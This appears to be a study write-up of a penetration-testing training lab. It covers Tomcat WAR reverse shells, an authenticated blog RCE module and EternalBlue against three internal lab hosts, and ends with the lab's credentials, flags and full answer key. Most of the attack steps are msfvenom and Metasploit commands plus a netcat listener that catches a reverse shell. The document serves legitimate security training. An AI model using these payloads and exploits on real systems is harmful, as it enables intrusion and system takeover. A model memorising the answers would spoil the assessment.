# LAB — The Live Engagement (Skills Assessment)

## ID
413

## Module
Shells & Payloads

## Kind
lab

## Title
Section 16 — The Live Engagement

## Description
Module skills assessment — three internal Inlanefreight hosts reached via a foothold jump box. Tomcat WAR deployment (Host-1), authenticated PHP RCE via lightweight blog (Host-2), and EternalBlue (Host-3). All targets accessed only from the foothold's `172.16.x.x` network.

## Tags
skills-assessment, tomcat, war, eternalblue, ms17-010, msfvenom, lightweight-fb-blog, foothold, pivot

## Commands
- `xfreerdp /v:<foothold-ip> /u:htb-student /p:HTB_@cademy_stdnt!` — RDP to foothold
- `ip a | grep "172.16.1.*"` — find the foothold's internal IP (for LHOST)
- `nmap -A 172.16.1.11` / `nmap -A blog.inlanefreight.local` / `nmap -A 172.16.1.13` — recon each host
- `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<foothold-internal-ip> LPORT=9001 -f war -o managerUpdated.war` — WAR shell for Tomcat
- `nc -nvlp 9001` — listener on foothold
- `msfconsole -q` → `use 50064.rb` — Lightweight FB Blog 1.3 Auth RCE (PHP)
- `msfconsole -q` → `use exploit/windows/smb/ms17_010_psexec` — EternalBlue

## What This Section Covers
End-to-end multi-host scenario: connect to a Parrot foothold via RDP, run all attacks from there (not from Pwnbox directly). The foothold sits on the internal `172.16.0.0/23` network where the targets live.

## Targets — Quick Reference
| Host | Address | Vector | Hostname |
|------|---------|--------|----------|
| **Host-1** | `172.16.1.11:8080` | Tomcat Manager — WAR upload | **shells-winsvr** |
| **Host-2** | `blog.inlanefreight.local` (172.16.1.12) | Lightweight FB Blog 1.3 auth RCE | (Ubuntu) |
| **Host-3** | `172.16.1.13` | MS17-010 EternalBlue (SMB) | **shells-winblue** |

## Connectivity
```shell
xfreerdp /v:<foothold-ip> /u:htb-student /p:HTB_@cademy_stdnt!
```
All listeners and exploits must run *from the foothold*, with `LHOST` set to the foothold's `172.16.1.5` interface (or whatever IP `ip a` shows for `ens224`).

## Host-1 — Tomcat WAR Deploy
1. `nmap -A 172.16.1.11` → Tomcat 10.0.11 on 8080; RDP cert shows hostname `shells-winsvr`.
2. Browse `http://172.16.1.11:8080` → Manager App → login `tomcat:Tomcatadm` (from hint).
3. Generate WAR payload (LHOST = foothold's internal IP):
   ```shell
   msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=9001 -f war -o managerUpdated.war
   ```
4. Listener:
   ```shell
   nc -nvlp 9001
   ```
5. Upload + Deploy WAR in Manager App. Click the deployed app's path to trigger.
6. Catch shell → `dir C:\Shares\` → `dev-share`.

## Host-2 — Lightweight FB Blog 1.3 Auth RCE
1. `nmap -A blog.inlanefreight.local` → Apache 2.4.41 on Ubuntu, SSH 8.2p1.
2. Browse `blog.inlanefreight.local` → forum post by "Slade Wilson" hints at the CVE.
3. Credentials from hint: `admin:admin123!@#`.
4. `searchsploit 50064.rb` → ExploitDB module exists locally.
5. `msfconsole -q` → `use 50064.rb`:
   ```
   set VHOST blog.inlanefreight.local
   set RHOSTS 172.16.1.12
   set RHOST 172.16.1.12
   set USERNAME admin
   set PASSWORD admin123!@#
   exploit
   ```
6. Meterpreter (PHP/Meterpreter/bind_tcp) → `cat /customscripts/flag.txt` → `B1nD_Shells_r_cool`.

## Host-3 — EternalBlue
1. `nmap -A 172.16.1.13` → Windows Server 2016, ports 139/445 open, hostname `SHELLS-WINBLUE`. Hint says "Blue" → EternalBlue.
2. `msfconsole -q` → `use exploit/windows/smb/ms17_010_psexec`:
   ```
   set LHOST 172.16.1.5
   set RHOSTS 172.16.1.13
   exploit
   ```
3. `Meterpreter session ... NT AUTHORITY\SYSTEM`.
4. `cat C:/Users/Administrator/Desktop/Skills-flag.txt` → `One-H0st-Down!`.

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Hostname of Host-1 (lowercase) | **shells-winsvr** | `nmap -A 172.16.1.11` RDP cert / NTLM_Info shows `shells-winsvr`. |
| Q2 — Folder name in `C:\Shares\` on Host-1 | **dev-share** | After Tomcat WAR shell: `dir C:\Shares\`. |
| Q3 — Linux distro on Host-2 (lowercase) | **ubuntu** | `nmap -A` SSH banner: `OpenSSH 8.2p1 Ubuntu 4ubuntu0.3`. |
| Q4 — Language of the shell uploaded by `50064.rb` | **php** | `grep "DefaultOptions" 50064.rb` shows `'PAYLOAD' => 'php/meterpreter/bind_tcp'`. |
| Q5 — Contents of `/customscripts/flag.txt` on Host-2 | **B1nD_Shells_r_cool** | After Meterpreter session: `cat /customscripts/flag.txt`. |
| Q6 — Hostname of Host-3 (lowercase) | **shells-winblue** | `nmap -A 172.16.1.13` → SMB OS discovery: NetBIOS name `SHELLS-WINBLUE`. |
| Q7 — Contents of `C:\Users\Administrator\Desktop\Skills-flag.txt` | **One-H0st-Down!** | After EternalBlue Meterpreter as SYSTEM: `cat C:/Users/Administrator/Desktop/Skills-flag.txt`. |

## Key Takeaways
- **LHOST must be the foothold's internal IP**, not Pwnbox's external IP. Targets can't route to Pwnbox.
- Tomcat Manager App + valid creds = trivial RCE via WAR upload — `java/jsp_shell_reverse_tcp` is the go-to msfvenom payload.
- ExploitDB `.rb` modules can be loaded directly via `use <path>` once searchsploit places them.
- The lab Hostname formatting prompts want **lowercase** — match the prompt's specification exactly.

## Gotchas
- Pwnbox spawns reset network on switch — use the foothold or persistent VPN.
- Tomcat WAR-shell payload size > 1KB — silent failure if your listener disconnects mid-upload.
- `setRHOSTS` typo issue from walkthrough — verify with `show options` before `exploit`.
- For Host-2 the module's PHP payload is **bind_tcp** (not reverse) — listener semantics differ; MSF handles it but if you build a manual listener, listen on the *target*, not the attacker.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|shells-payloads]]
← [[15-php-web-shells]] | [[17-detection-and-prevention]] →
<!-- AUTO-LINKS-END -->
